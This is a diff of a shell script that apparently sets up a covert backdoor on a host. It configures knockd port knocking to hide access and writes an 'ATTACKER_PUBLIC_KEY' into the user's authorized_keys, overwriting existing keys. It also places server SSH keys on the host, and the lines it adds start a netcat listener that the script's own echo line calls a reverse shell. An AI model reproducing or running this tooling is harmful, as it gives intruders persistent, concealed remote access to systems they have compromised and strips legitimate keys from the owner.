@@ -20,8 +20,8 @@ sudo systemctl start netfilter-persistent
 sudo netfilter-persistent save
 sudo netfilter-persistent reload
 
-echo "$KNOCKD_CONF" >> /etc/knockd.conf
-echo "$KNOCKD_CONF2" >> /etc/default/knockd
+echo "$KNOCKD_CONF" > /etc/knockd.conf
+echo "$KNOCKD_CONF2" > /etc/default/knockd
 
 sudo systemctl enable knockd
 sudo systemctl start knockd
@@ -32,7 +32,7 @@ sudo systemctl start knockd
 ########################################################################
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
-echo "$ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
+echo "$ATTACKER_PUBLIC_KEY" > ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
 ########################################################################
@@ -44,7 +44,15 @@ chmod 600 ~/.ssh/authorized_keys
 ########################################################################
 ####################### SERVER SSH SETUP ###############################
 ########################################################################
-echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/CENTRAL.pub
-echo "$SERVER_PRIVATE_KEY" >> ~/.ssh/CENTRAL
+echo "$SERVER_PUBLIC_KEY" > ~/.ssh/CENTRAL.pub
+echo "$SERVER_PRIVATE_KEY" > ~/.ssh/CENTRAL
 
-echo "All done. You should reboot."
+echo "All done. If this is your first time, reboot. Otherwise, here is the reverse shell:"
+
+########################################################################
+####################### REVERSE SHELL SETUP ###############################
+########################################################################
+nc -lvp $SERVER_TUNNEL_PORT  
+
+
+
